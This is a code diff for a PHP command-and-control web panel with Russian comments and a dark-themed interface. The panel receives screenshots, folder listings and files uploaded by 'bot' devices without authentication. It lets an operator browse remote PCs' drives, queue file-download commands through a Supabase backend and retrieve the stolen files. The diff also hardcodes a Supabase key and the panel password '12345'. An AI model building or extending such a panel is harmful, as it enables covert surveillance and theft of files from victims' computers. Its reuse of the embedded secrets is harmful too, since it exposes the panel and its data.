@@ -4,11 +4,8 @@ session_start();
 error_reporting(E_ALL); ini_set('display_errors', 1);
 date_default_timezone_set('Europe/Moscow');
 
-// НАСТРОЙКИ SUPABASE
 define('SUPABASE_URL', 'https://bvskbsonxlntkpgywnoh.supabase.co/rest/v1');
 define('SUPABASE_KEY', 'sb_publishable_di1Z96CWhijr9DtO69YMYQ_AJmpg33y');
-
-// ПАРОЛЬ ОТ ПАНЕЛИ
 define('PANEL_PASSWORD', '12345'); 
 
 $cache_dir = __DIR__ . '/explorer_cache/';
@@ -42,23 +39,18 @@ function cleanOldFiles() {
     foreach ($folders as $dir) {
         if (is_dir($dir)) {
             foreach (glob($dir . '*') as $file) {
-                if (is_file($file)) {
-                    if ((time() - filemtime($file)) > 86400) {
-                        @unlink($file);
-                    }
+                if (is_file($file) && (time() - filemtime($file)) > 86400) {
+                    @unlink($file);
                 }
             }
         }
     }
 }
 
-// =========================================================================
-// 1. ПРИЕМ ФАЙЛОВ И ДАННЫХ ОТ БОТА (БЕЗ ТРЕБОВАНИЯ ПАРОЛЯ)
-// =========================================================================
+// 1. ПРИЕМ ФАЙЛОВ И ДАННЫХ ОТ БОТА
 if (isset($_POST['screenshot_device_id'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
     
-    // Сохранение структуры папок
     if (isset($_POST['folder_structure'])) {
         file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
         file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
@@ -66,18 +58,23 @@ if (isset($_POST['screenshot_device_id'])) {
         exit;
     }
     
-    // Сохранение скачанного файла с ПК
     if (isset($_FILES['downloaded_file'])) {
         $upload_dir = __DIR__ . '/downloads/';
         if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
         
+        if ($_FILES['downloaded_file']['error'] === UPLOAD_ERR_INI_SIZE || $_FILES['downloaded_file']['error'] === UPLOAD_ERR_FORM_SIZE) {
+            echo "SERVER_ERROR_FILE_TOO_LARGE";
+            exit;
+        }
+
         if ($_FILES['downloaded_file']['error'] !== UPLOAD_ERR_OK) {
             echo "SERVER_ERROR_UPLOAD_CODE_" . $_FILES['downloaded_file']['error'];
             exit;
         }
 
-        $filename = basename($_FILES['downloaded_file']['name']);
+        $filename = !empty($_POST['download_filename']) ? basename($_POST['download_filename']) : basename($_FILES['downloaded_file']['name']);
         $target_file = $upload_dir . $dev_id . '_' . $filename;
+        
         if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $target_file)) {
             file_put_contents($cache_dir . $dev_id . '_lastfile.txt', $filename);
             echo "SERVER_SAVED_FILE";
@@ -87,7 +84,6 @@ if (isset($_POST['screenshot_device_id'])) {
         exit;
     }
     
-    // Сохранение скриншота
     if (isset($_FILES['screenshot_file'])) {
         $upload_dir = __DIR__ . '/screenshots/';
         if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
@@ -102,9 +98,7 @@ if (isset($_POST['screenshot_device_id'])) {
     }
 }
 
-// =========================================================================
-// 2. АВТОРИЗАЦИЯ ВЕБ-ПАНЕЛИ
-// =========================================================================
+// 2. АВТОРИЗАЦИЯ
 $login_error = "";
 if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['login_password'])) {
     if ($_POST['login_password'] === PANEL_PASSWORD) {
@@ -136,11 +130,9 @@ if (!$is_authenticated) {
     <title>Вход — Панель Управления</title>
     <style>
         body { margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; display:flex; justify-content:center; align-items:center; height:100vh; }
-        .login-card { background:#111827; border:1px solid #1f2937; border-radius:14px; padding:30px; width:320px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align:center; }
-        .login-card h2 { margin-top:0; font-size:20px; color:#f8fafc; }
+        .login-card { background:#111827; border:1px solid #1f2937; border-radius:14px; padding:30px; width:320px; text-align:center; }
         .login-card input { width:100%; padding:12px; margin:15px 0; background:#030712; border:1px solid #374151; border-radius:8px; color:white; box-sizing:border-box; font-size:14px; text-align:center; }
-        .login-card button { width:100%; padding:12px; background:#4f46e5; color:white; border:none; border-radius:8px; font-weight:600; cursor:pointer; font-size:14px; transition:0.2s; }
-        .login-card button:hover { background:#4338ca; }
+        .login-card button { width:100%; padding:12px; background:#4f46e5; color:white; border:none; border-radius:8px; font-weight:600; cursor:pointer; }
         .error { color:#ef4444; font-size:13px; margin-bottom:10px; }
     </style>
     </head>
@@ -159,14 +151,9 @@ if (!$is_authenticated) {
     exit;
 }
 
-// =========================================================================
-// 3. ОСНОВНАЯ ЛОГИКА ВЕБ-ПАНЕЛИ
-// =========================================================================
-
-// API обновление для JS
+// 3. ОСНОВНАЯ ЛОГИКА ПАНЕЛИ
 if (isset($_GET['api_refresh_all'])) {
     header('Content-Type: application/json');
-    
     $devices_raw = supabaseRequest('/devices?select=*');
     $explorer_data = [];
     
@@ -188,9 +175,7 @@ if (isset($_GET['api_refresh_all'])) {
                 $time_clean = str_replace('T', ' ', $time_raw);
                 $time_clean = preg_replace('/\.\d+Z?/', '', $time_clean);
                 $last = @strtotime($time_clean);
-                if ($last > 0) {
-                    $formatted_last_seen = date('d.m.Y H:i:s', $last);
-                }
+                if ($last > 0) $formatted_last_seen = date('d.m.Y H:i:s', $last);
             }
 
             $isOnline = ((time() - $last) <= 40 && $last > 0);
@@ -209,15 +194,10 @@ if (isset($_GET['api_refresh_all'])) {
     }
     
     $logs = supabaseRequest('/commands?select=*&order=id.desc');
-    
-    echo json_encode([
-        "devices" => $explorer_data,
-        "logs" => is_array($logs) ? $logs : []
-    ]);
+    echo json_encode(["devices" => $explorer_data, "logs" => is_array($logs) ? $logs : []]);
     exit;
 }
 
-// Отдача файла браузеру
 if (isset($_GET['get_file']) && isset($_GET['dev'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
     $file = __DIR__ . '/downloads/' . $dev_id . '_' . basename($_GET['get_file']);
@@ -228,6 +208,7 @@ if (isset($_GET['get_file']) && isset($_GET['dev'])) {
     } else { echo "Файл не найден на сервере."; }
     exit;
 }
+
 if (isset($_GET['download_screen'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['download_screen']);
     $file = __DIR__ . '/screenshots/screen_' . $dev_id . '.jpg';
@@ -235,7 +216,6 @@ if (isset($_GET['download_screen'])) {
     exit;
 }
 
-// Обработка команд из формы
 if ($_SERVER["REQUEST_METHOD"] === "POST" && !isset($_POST['login_password'])) {
     $action = $_POST["action"] ?? ""; 
     $device_id = $_POST["device_id"] ?? ""; 
@@ -287,17 +267,14 @@ button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; 
 .red { background:#dc2626; color:white; } .red:hover{ background:#b91c1c; }
 .gray-danger { background:#374151; color:#f3f4f6; border: 1px solid #4b5563; } .gray-danger:hover{ background:#1f2937; }
 
-/* Увеличенный и удобный проводник файлов */
 .explorer-box { 
     background:#030712; 
     border:1px solid #1f2937; 
     border-radius:8px; 
     padding:10px; 
     margin-top:10px; 
-    height: 450px; /* Увеличено с 280px до 450px */
+    height: 420px; 
     overflow-y: auto; 
-    scrollbar-width: thin;
-    scrollbar-color: #374151 #030712;
 }
 .exp-item { display:flex; justify-content:space-between; align-items:center; padding:7px 4px; border-bottom:1px solid #1f2937; font-size:12px; }
 .exp-btn { background:none; border:none; color:#60a5fa; text-align:left; padding:0; width:auto; margin:0; display:inline; font-weight:normal; font-family:monospace; cursor:pointer;}
@@ -307,7 +284,7 @@ button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; 
     background: #064e3b;
     border: 1px solid #059669;
     border-radius: 8px;
-    padding: 10px;
+    padding: 12px;
     margin-top: 12px;
     text-align: center;
 }
@@ -334,7 +311,7 @@ th { color: #64748b; font-size: 11px; text-transform: uppercase;}
         <div class="name" style="font-size:15px; margin:0;">📋 Системные отчеты выполнения (Live)</div>
         <div style="display: flex; gap: 8px;">
             <button type="button" class="orange" style="width: auto; padding: 6px 12px; margin: 0; font-size: 11px;" onclick="if(confirm('Удалить скриншоты и файлы старше 24 часов?')) sendCmdAsync('', 'clean_files')">🧹 Очистить файлы > 24ч</button>
-            <button type="button" class="gray-danger" style="width: auto; padding: 6px 12px; margin: 0; font-size: 11px;" onclick="if(confirm('Очистить всю историю команд?')) sendCmdAsync('', 'clear_commands')">🗑 Очистить историю</button>
+            <button type="button" class="gray-danger" style="width: auto; padding: 6px 12px; margin: 0; font-size: 11px;" onclick="if(confirm('Очистить историю команд?')) sendCmdAsync('', 'clear_commands')">🗑 Очистить историю</button>
         </div>
     </div>
     <table>
@@ -353,8 +330,16 @@ th { color: #64748b; font-size: 11px; text-transform: uppercase;}
 </div>
 
 <script>
-// Глобальный объект для сохранения позиции скролла каждого проводника
 let explorerScrollPositions = {};
+
+// Безопасное кодирование в Base64 для избежания ошибок в кавычках и символах
+function encodePath(str) {
+    return btoa(encodeURIComponent(str));
+}
+
+function decodePath(str) {
+    return decodeURIComponent(atob(str));
+}
 
 function sendCmdAsync(deviceId, action, targetPath = '') {
     let formData = new FormData();
@@ -365,14 +350,23 @@ function sendCmdAsync(deviceId, action, targetPath = '') {
     fetch(window.location.href, { method: 'POST', body: formData }).catch(err => console.error("Ошибка отправки:", err));
 }
 
+function requestDownloadB64(deviceId, b64Path) {
+    let realPath = decodePath(b64Path);
+    if (confirm('Скачать файл с ПК:\n' + realPath + ' ?')) {
+        sendCmdAsync(deviceId, 'download_file', realPath);
+    }
+}
+
+function requestFolderB64(deviceId, b64Path) {
+    let realPath = decodePath(b64Path);
+    sendCmdAsync(deviceId, 'get_files', realPath);
+}
+
 function startRealtimeMonitor() {
     setInterval(() => {
-        // 1. Запоминаем текущую позицию скролла перед обновлением HTML
         document.querySelectorAll('.explorer-box').forEach(box => {
             let devId = box.dataset.devid;
-            if (devId) {
-                explorerScrollPositions[devId] = box.scrollTop;
-            }
+            if (devId) explorerScrollPositions[devId] = box.scrollTop;
         });
 
         fetch('?api_refresh_all=1')
@@ -382,7 +376,7 @@ function startRealtimeMonitor() {
             let hasDevices = Object.keys(data.devices).length > 0;
             
             if (!hasDevices) {
-                container.innerHTML = `<div style="color:#4b5563; grid-column:1/-1; text-align:center; padding:40px;">Нет зафиксированных ПК в базе</div>`;
+                container.innerHTML = `<div style="color:#4b5563; grid-column:1/-1; text-align:center; padding:40px;">Нет ПК в базе</div>`;
             } else {
                 let containerHtml = '';
                 for (let id in data.devices) {
@@ -394,29 +388,29 @@ function startRealtimeMonitor() {
                     let explorerHtml = '';
                     if (pc.current_path !== 'C:\\' && pc.current_path !== 'C:/' && pc.current_path !== '') {
                         let parts = pc.current_path.split(/[\\\/]/); parts.pop(); if(parts.length <= 1) parts = ['C:'];
-                        let parentPath = parts.join('\\\\'); if(!parentPath.endsWith('\\')) parentPath += '\\\\';
-                        explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#f59e0b;" onclick="sendCmdAsync('${id}', 'get_files', '${parentPath}')">📁 .. [Назад]</button></div>`;
+                        let parentPath = parts.join('\\'); if(!parentPath.endsWith('\\')) parentPath += '\\';
+                        let b64Parent = encodePath(parentPath);
+                        explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#f59e0b;" onclick="requestFolderB64('${id}', '${b64Parent}')">📁 .. [Назад]</button></div>`;
                     }
 
                     if (!pc.items || pc.items.length === 0) {
                         explorerHtml += `<span style='font-size:11px; color:#4b5563;'>Нажмите Обновить / Корень</span>`;
                     } else {
                         pc.items.forEach(item => {
-                            let safePath = item.path.replace(/\\/g, '\\\\');
+                            let b64ItemPath = encodePath(item.path);
                             if (item.is_dir) {
-                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" onclick="sendCmdAsync('${id}', 'get_files', '${safePath}')">📁 ${item.name}</button></div>`;
+                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" onclick="requestFolderB64('${id}', '${b64ItemPath}')">📁 ${item.name}</button></div>`;
                             } else {
-                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#10b981;" onclick="if(confirm('Запросить скачивание с ПК?')) sendCmdAsync('${id}', 'download_file', '${safePath}')">📄 ${item.name}</button><span style="font-size:10px; color:#4b5563;">${item.size}</span></div>`;
+                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#10b981;" onclick="requestDownloadB64('${id}', '${b64ItemPath}')">📄 ${item.name}</button><span style="font-size:10px; color:#4b5563;">${item.size}</span></div>`;
                             }
                         });
                     }
 
-                    // Заметный блок скачивания файла
                     let downloadBtnHtml = '';
                     if (pc.last_file) {
                         downloadBtnHtml = `
                         <div class="download-ready-box">
-                            <span style="font-size:12px; color:#a7f3d0; font-weight:bold; display:block;">Готов к сохранению:</span>
+                            <span style="font-size:12px; color:#a7f3d0; font-weight:bold; display:block;">Файл успешно получен:</span>
                             <a href="?get_file=${encodeURIComponent(pc.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:6px; font-weight:bold;">💾 СКАЧАТЬ НА ЭТОТ ПК: ${pc.last_file}</a>
                         </div>`;
                     }
@@ -455,7 +449,6 @@ function startRealtimeMonitor() {
                     container.innerHTML = containerHtml;
                     container.dataset.lastHtml = containerHtml;
 
-                    // 2. Восстанавливаем позицию скролла ПОСЛЕ вставки нового HTML
                     document.querySelectorAll('.explorer-box').forEach(box => {
                         let devId = box.dataset.devid;
                         if (devId && explorerScrollPositions[devId] !== undefined) {
@@ -476,14 +469,14 @@ function startRealtimeMonitor() {
                             <td style="font-family:monospace; color:#64748b;">${l.id}</td>
                             <td style="font-family:monospace;">${l.device_id}</td>
                             <td style="color:#60a5fa;">${l.action}</td>
-                            <td style="font-weight:600; color:#10b981;">${l.log || ''}</td>
+                            <td style="font-weight:600; color:${(l.log||'').includes('Ошибка') ? '#ef4444' : '#10b981'};">${l.log || ''}</td>
                         </tr>`;
                     });
                 }
                 logsBody.innerHTML = logsHtml;
             }
         })
-        .catch(err => console.error("Ошибка получения данных:", err));
+        .catch(err => console.error("Ошибка:", err));
     }, 1500);
 }
 
